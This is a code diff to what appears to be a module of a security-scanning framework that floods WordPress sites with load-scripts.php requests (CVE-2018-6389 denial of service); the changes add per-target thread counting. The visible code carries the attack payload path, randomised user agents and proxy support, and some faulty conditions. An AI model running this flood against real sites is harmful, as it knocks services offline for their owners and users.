@@ -20,11 +20,11 @@ from core.alert import *
 from core.targets import target_type
 from core.targets import target_to_host
 from core.load_modules import load_file_path
-from lib.icmp.engine import do_one as do_one_ping
 from lib.socks_resolver.engine import getaddrinfo
 from core._time import now
 from core.log import __log_into_file
 from core._die import __die_failure
+from lib import threads_counter
 
 
 def extra_requirements_dict():
@@ -35,7 +35,7 @@ def extra_requirements_dict():
     }
 
 
-def send_dos(target, user_agent, timeout_sec, log_in_file, language, time_sleep, thread_tmp_filename, retries,
+def send_dos(target, b_target, user_agent, timeout_sec, language, time_sleep, thread_tmp_filename, retries,
              socks_proxy, scan_id, scan_cmd):
     time.sleep(time_sleep)
     payload = "/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack" \
@@ -87,8 +87,24 @@ def send_dos(target, user_agent, timeout_sec, log_in_file, language, time_sleep,
                 socket.socket = socks.socksocket
                 socket.getaddrinfo = getaddrinfo
         r = requests.get(target + payload, timeout=timeout_sec, headers=user_agent).content
+        try:
+            threads_counter.active_threads[b_target] -= 1
+        except:
+            pass
+        try:
+            threads_counter.active_threads[b_target + '->' + 'wordpress_dos_cve_2018_6389_vuln'] -= 1
+        except:
+            pass
         return True
     except:
+        try:
+            threads_counter.active_threads[b_target] -= 1
+        except:
+            pass
+        try:
+            threads_counter.active_threads[b_target + '->' + 'wordpress_dos_cve_2018_6389_vuln'] -= 1
+        except:
+            pass
         return False
 
 
@@ -136,6 +152,8 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
           verbose_level, socks_proxy, retries, methods_args, scan_id, scan_cmd):  # Main function
     if target_type(target) != 'SINGLE_IPv4' or target_type(target) != 'DOMAIN' or target_type(
             target) != 'HTTP' or target_type(target) != 'SINGLE_IPv6':
+        b_target = target
+        threads_counter.active_threads[b_target + '->' + 'wordpress_dos_cve_2018_6389_vuln'] += 1
         # rand useragent
         user_agent_list = [
             "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060719 Firefox/1.5.0.5",
@@ -202,11 +220,13 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
             if random_agent_flag:
                 user_agent = {'User-agent': random.choice(user_agent_list)}
             t = threading.Thread(target=send_dos,
-                                 args=(url, user_agent, timeout_sec, log_in_file, language, time_sleep,
-                                       thread_tmp_filename, retries, socks_proxy, scan_id,
-                                       scan_cmd))
+                                 args=(url, b_target, user_agent, timeout_sec, language, time_sleep,
+                                       thread_tmp_filename, retries, socks_proxy, scan_id, scan_cmd))
             threads.append(t)
             t.start()
+            threads_counter.active_threads[b_target] += 1
+            if n is not 1:
+                threads_counter.active_threads[b_target + '->' + 'wordpress_dos_cve_2018_6389_vuln'] += 1
             trying += 1
             if verbose_level > 3:
                 info(messages(language, 72).format(trying, total_req, num, total, target_to_host(target), port,
@@ -219,7 +239,7 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
                 pass
             while 1:
                 try:
-                    if threading.activeCount() >= max:
+                    if threads_counter.active_threads[b_target] >= max:
                         time.sleep(0.01)
                     else:
                         break
@@ -234,7 +254,8 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
             time.sleep(0.1)
             kill_switch += 1
             try:
-                if threading.activeCount() is 2 or kill_switch is kill_time:
+                if threads_counter.active_threads[b_target + '->' + 'wordpress_dos_cve_2018_6389_vuln'] is 0 \
+                        or kill_switch is kill_time:
                     break
             except KeyboardInterrupt:
                 break
